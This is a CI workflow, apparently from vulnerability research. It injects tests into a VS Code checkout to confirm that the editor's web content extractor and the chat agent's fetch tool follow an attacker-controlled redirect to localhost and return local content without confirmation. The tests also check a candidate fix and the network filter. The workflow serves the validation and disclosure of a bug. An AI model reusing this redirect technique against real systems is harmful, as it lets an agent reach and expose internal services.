name: VS Code localhost redirect full validation

on:
  push:
    branches: [ research/vscode-validation-20260920 ]

permissions:
  contents: read

jobs:
  validate:
    runs-on: ubuntu-24.04
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 24.20.0

      - name: Checkout current VS Code main
        run: |
          set -euxo pipefail
          git clone --depth=1 https://github.com/microsoft/vscode.git vscode
          cd vscode
          echo "VSCODE_HEAD=$(git rev-parse HEAD)"

      - name: Install build and Electron dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y xvfb libkrb5-dev libx11-dev libxkbfile-dev pkg-config libgtk-3-0 libnss3 libasound2t64
          echo "127.0.0.1 attacker.example control.example" | sudo tee -a /etc/hosts
          cd vscode
          npm ci --no-audit --no-fund
          npm run transpile-client
          npm run electron

      - name: Inject authorized regression tests
        working-directory: vscode
        env:
          MAIN_INJECTION: "\n\t// === Authorized localhost redirect SSRF integration regression ===\n\ttry {\n\t\tconst assert = require('assert');\n\t\tconst [\n\t\t\t{ URI },\n\t\t\t{ NativeWebContentExtractorService },\n\t\t\t{ WebPageLoader },\n\t\t\t{ isURLDomainTrusted, isLocalhostAuthority },\n\t\t\t{ AgentNetworkFilterService },\n\t\t\t{ AgentNetworkDomainSettingId },\n\t\t\t{ TestConfigurationService },\n\t\t] = await Promise.all([\n\t\t\timport(url.pathToFileURL(path.join(__dirname, '../../../out/vs/base/common/uri.js')).href),\n\t\t\timport(url.pathToFileURL(path.join(__dirname, '../../../out/vs/platform/webContentExtractor/electron-main/webContentExtractorService.js')).href),\n\t\t\timport(url.pathToFileURL(path.join(__dirname, '../../../out/vs/platform/webContentExtractor/electron-main/webPageLoader.js')).href),\n\t\t\timport(url.pathToFileURL(path.join(__dirname, '../../../out/vs/platform/url/common/trustedDomains.js')).href),\n\t\t\timport(url.pathToFileURL(path.join(__dirname, '../../../out/vs/platform/networkFilter/common/networkFilterService.js')).href),\n\t\t\timport(url.pathToFileURL(path.join(__dirname, '../../../out/vs/platform/networkFilter/common/settings.js')).href),\n\t\t\timport(url.pathToFileURL(path.join(__dirname, '../../../out/vs/platform/configuration/test/common/testConfigurationService.js')).href),\n\t\t]);\n\n\t\tconst logger = { trace() {}, debug() {}, info() {}, warn() {}, error() {}, flush() {} };\n\t\tconst listen = (server, host) => new Promise((resolve, reject) => {\n\t\t\tserver.once('error', reject);\n\t\t\tserver.listen(0, host, () => resolve(server.address().port));\n\t\t});\n\t\tconst close = server => new Promise(resolve => server.close(resolve));\n\t\tconst hits = { loopback: 0, control: 0, ipv6: 0 };\n\n\t\tconst loopbackTarget = http.createServer((req, res) => {\n\t\t\thits.loopback++;\n\t\t\tres.writeHead(200, { 'content-type': 'text/markdown' });\n\t\t\tres.end('LOOPBACK_SENTINEL_4c82d1\\n'.repeat(20));\n\t\t});\n\t\tconst controlTarget = http.createServer((req, res) => {\n\t\t\thits.control++;\n\t\t\tres.writeHead(200, { 'content-type': 'text/markdown' });\n\t\t\tres.end('CONTROL_SENTINEL_SHOULD_NOT_BE_REACHED\\n'.repeat(20));\n\t\t});\n\t\tconst loopPort = await listen(loopbackTarget, '127.0.0.1');\n\t\tconst controlPort = await listen(controlTarget, '127.0.0.1');\n\n\t\tlet ipv6Target;\n\t\tlet ipv6Port;\n\t\ttry {\n\t\t\tipv6Target = http.createServer((req, res) => {\n\t\t\t\thits.ipv6++;\n\t\t\t\tres.writeHead(200, { 'content-type': 'text/markdown' });\n\t\t\t\tres.end('IPV6_LOOPBACK_SENTINEL_0d91aa\\n'.repeat(20));\n\t\t\t});\n\t\t\tipv6Port = await listen(ipv6Target, '::1');\n\t\t} catch (e) {\n\t\t\tipv6Target = undefined;\n\t\t\tconsole.log('IPV6_LOOPBACK_TEST=SKIPPED:' + e.message);\n\t\t}\n\n\t\tconst source = http.createServer((req, res) => {\n\t\t\tlet location;\n\t\t\tif (req.url === '/to127') location = 'http://127.0.0.1:' + loopPort + '/secret';\n\t\t\telse if (req.url === '/tolocalhost') location = 'http://localhost:' + loopPort + '/secret';\n\t\t\telse if (req.url === '/toipv6' && ipv6Port) location = 'http://[::1]:' + ipv6Port + '/secret';\n\t\t\telse if (req.url === '/control') location = 'http://control.example:' + controlPort + '/blocked';\n\t\t\telse if (req.url === '/fix-control') location = 'http://127.0.0.1:' + loopPort + '/fixed';\n\t\t\telse if (req.url === '/filter-control') location = 'http://127.0.0.1:' + loopPort + '/filtered';\n\t\t\telse { res.writeHead(404); res.end('not found'); return; }\n\t\t\tres.writeHead(302, { location });\n\t\t\tres.end();\n\t\t});\n\t\tconst sourcePort = await listen(source, '127.0.0.1');\n\n\t\tconst defaultConfig = new TestConfigurationService();\n\t\tconst defaultFilter = new AgentNetworkFilterService(defaultConfig);\n\t\tassert.strictEqual(defaultFilter.isEnabled(), false);\n\t\tconst extractor = new NativeWebContentExtractorService(logger, defaultFilter);\n\n\t\tconst extractRoute = async route => {\n\t\t\tconst src = URI.parse('http://attacker.example:' + sourcePort + route);\n\t\t\tconst [result] = await extractor.extract([src], { trustedDomains: [] });\n\t\t\treturn result;\n\t\t};\n\n\t\tconst before127 = hits.loopback;\n\t\tconst r127 = await extractRoute('/to127');\n\t\tassert.strictEqual(r127.status, 'ok');\n\t\tassert.ok(r127.result.includes('LOOPBACK_SENTINEL_4c82d1'));\n\t\tassert.ok(hits.loopback > before127);\n\t\tconsole.log('REAL_REDIRECT_127_SENTINEL=CONFIRMED');\n\n\t\tconst beforeLocalhost = hits.loopback;\n\t\tconst rLocalhost = await extractRoute('/tolocalhost');\n\t\tassert.strictEqual(rLocalhost.status, 'ok');\n\t\tassert.ok(rLocalhost.result.includes('LOOPBACK_SENTINEL_4c82d1'));\n\t\tassert.ok(hits.loopback > beforeLocalhost);\n\t\tconsole.log('REAL_REDIRECT_LOCALHOST_SENTINEL=CONFIRMED');\n\n\t\tif (ipv6Port) {\n\t\t\tconst beforeIPv6 = hits.ipv6;\n\t\t\tconst rIPv6 = await extractRoute('/toipv6');\n\t\t\tassert.strictEqual(rIPv6.status, 'ok');\n\t\t\tassert.ok(rIPv6.result.includes('IPV6_LOOPBACK_SENTINEL_0d91aa'));\n\t\t\tassert.ok(hits.ipv6 > beforeIPv6);\n\t\t\tconsole.log('REAL_REDIRECT_IPV6_SENTINEL=CONFIRMED');\n\t\t}\n\n\t\tconst beforeControl = hits.control;\n\t\tconst control = await extractRoute('/control');\n\t\tassert.strictEqual(control.status, 'redirect');\n\t\tassert.strictEqual(hits.control, beforeControl);\n\t\tconsole.log('NONTRUSTED_REDIRECT_BLOCKED=CONFIRMED');\n\n\t\tassert.strictEqual(isURLDomainTrusted(URI.parse('http://127.0.0.1:' + loopPort + '/x'), []), true);\n\t\tassert.strictEqual(isURLDomainTrusted(URI.parse('http://localhost:' + loopPort + '/x'), []), true);\n\t\tassert.strictEqual(isURLDomainTrusted(URI.parse('http://[::1]:' + (ipv6Port || 1) + '/x'), []), true);\n\t\tconsole.log('LOOPBACK_TRUST_MATRIX=CONFIRMED');\n\n\t\tconst fixedBefore = hits.loopback;\n\t\tconst fixedSource = URI.parse('http://attacker.example:' + sourcePort + '/fix-control');\n\t\tconst fixedLoader = new WebPageLoader(\n\t\t\toptions => new BrowserWindow(options),\n\t\t\tlogger,\n\t\t\tfixedSource,\n\t\t\tundefined,\n\t\t\tu => isURLDomainTrusted(u, []) && !isLocalhostAuthority(u.authority),\n\t\t\tdefaultFilter\n\t\t);\n\t\tconst fixedResult = await fixedLoader.load();\n\t\tfixedLoader.dispose();\n\t\tassert.strictEqual(fixedResult.status, 'redirect');\n\t\tassert.strictEqual(hits.loopback, fixedBefore);\n\t\tconsole.log('NEGATIVE_FIX_CONTROL=PASS');\n\n\t\tconst filteredConfig = new TestConfigurationService();\n\t\tfilteredConfig.setUserConfiguration(AgentNetworkDomainSettingId.NetworkFilter, true);\n\t\tfilteredConfig.setUserConfiguration(AgentNetworkDomainSettingId.AllowedNetworkDomains, ['attacker.example']);\n\t\tfilteredConfig.setUserConfiguration(AgentNetworkDomainSettingId.DeniedNetworkDomains, []);\n\t\tconst enabledFilter = new AgentNetworkFilterService(filteredConfig);\n\t\tassert.strictEqual(enabledFilter.isUriAllowed(URI.parse('http://attacker.example:' + sourcePort)), true);\n\t\tassert.strictEqual(enabledFilter.isUriAllowed(URI.parse('http://127.0.0.1:' + loopPort)), false);\n\t\tconst filteredExtractor = new NativeWebContentExtractorService(logger, enabledFilter);\n\t\tconst filterBefore = hits.loopback;\n\t\tconst [filteredResult] = await filteredExtractor.extract(\n\t\t\t[URI.parse('http://attacker.example:' + sourcePort + '/filter-control')],\n\t\t\t{ trustedDomains: [] }\n\t\t);\n\t\tassert.strictEqual(filteredResult.status, 'error');\n\t\tassert.strictEqual(hits.loopback, filterBefore);\n\t\tconsole.log('OPT_IN_NETWORK_FILTER_MITIGATES=CONFIRMED');\n\n\t\tfilteredExtractor.dispose();\n\t\tenabledFilter.dispose();\n\t\textractor.dispose();\n\t\tdefaultFilter.dispose();\n\t\tawait Promise.all([close(source), close(loopbackTarget), close(controlTarget), ipv6Target ? close(ipv6Target) : Promise.resolve()]);\n\t\tconsole.log('REAL_WEB_CONTENT_EXTRACTOR_LOCALHOST_SSRF=CONFIRMED');\n\t} catch (error) {\n\t\tconsole.error('LOCALHOST_REDIRECT_INTEGRATION_FAILURE', error);\n\t\tapp.exit(1);\n\t\treturn;\n\t}\n"
          FETCH_TEST: "\n\ttest('user-mentioned remote URL requires no confirmation and extracted content is returned directly', async () => {\n\t\tconst source = URI.parse('http://attacker.example/start');\n\t\tconst sentinel = 'LOOPBACK_SENTINEL_FETCH_TOOL_77a1';\n\t\tconst extractor = new TestWebContentExtractorService(new ResourceMap<string>([[source, sentinel]]));\n\t\tconst tool = new FetchWebPageTool(\n\t\t\textractor,\n\t\t\tnew ExtendedTestFileService(new ResourceMap<string | VSBuffer>()),\n\t\t\tnew MockTrustedDomainService([]),\n\t\t\tupcastDeepPartial<IChatService>({\n\t\t\t\tgetSession: () => ({\n\t\t\t\t\tgetRequests: () => [{ message: { text: 'please fetch http://attacker.example/start' } }],\n\t\t\t\t}),\n\t\t\t}),\n\t\t\tnew TestContextService(),\n\t\t\tnew MockAgentNetworkFilterService(),\n\t\t);\n\n\t\tconst prep = await tool.prepareToolInvocation(\n\t\t\t{ parameters: { urls: [source.toString()] }, toolCallId: 'redirect-approval-scope', chatSessionResource: LocalChatSessionUri.forSession('redirect-scope') },\n\t\t\tCancellationToken.None\n\t\t);\n\t\tassert.strictEqual(prep?.confirmationMessages?.title, undefined);\n\t\tassert.strictEqual(prep?.confirmationMessages?.confirmResults, false);\n\t\tassert.ok(String(prep?.confirmationMessages?.confirmationNotNeededReason).includes('Auto approved because URL was in prompt'));\n\n\t\tconst result = await tool.invoke(\n\t\t\t{ callId: 'redirect-approval-scope', toolId: InternalFetchWebPageToolId, parameters: { urls: [source.toString()] }, context: undefined },\n\t\t\t() => Promise.resolve(0),\n\t\t\t{ report: () => { } },\n\t\t\tCancellationToken.None\n\t\t);\n\t\tassert.strictEqual(result.content[0].value, sentinel);\n\t\tassert.strictEqual(result.confirmResults, undefined);\n\t\tassert.deepStrictEqual(extractor.requestedUris.map(u => u.toString()), [source.toString()]);\n\t\tconsole.log('FETCH_TOOL_USER_MENTION_NO_CONFIRMATION=CONFIRMED');\n\t});\n"
        run: |
          set -euxo pipefail
          python3 - <<'PY'
          import os
          from pathlib import Path

          main = Path("test/unit/electron/index.js")
          s = main.read_text()
          marker = "app.on('ready', async () => {\n"
          assert marker in s
          main.write_text(s.replace(marker, marker + os.environ["MAIN_INJECTION"], 1))

          fetch = Path("src/vs/workbench/contrib/chat/test/electron-browser/tools/builtinTools/fetchPageTool.test.ts")
          fs = fetch.read_text()
          fmarker = "suite('FetchWebPageTool', () => {\n"
          assert fmarker in fs
          fetch.write_text(fs.replace(fmarker, fmarker + os.environ["FETCH_TEST"], 1))
          PY
          npm run transpile-client

      - name: Run real Electron and Fetch-tool regressions
        working-directory: vscode
        run: |
          set -euxo pipefail
          xvfb-run -a ./scripts/test.sh             --run src/vs/platform/webContentExtractor/test/electron-main/webPageLoader.test.ts             --run src/vs/workbench/contrib/chat/test/electron-browser/tools/builtinTools/fetchPageTool.test.ts
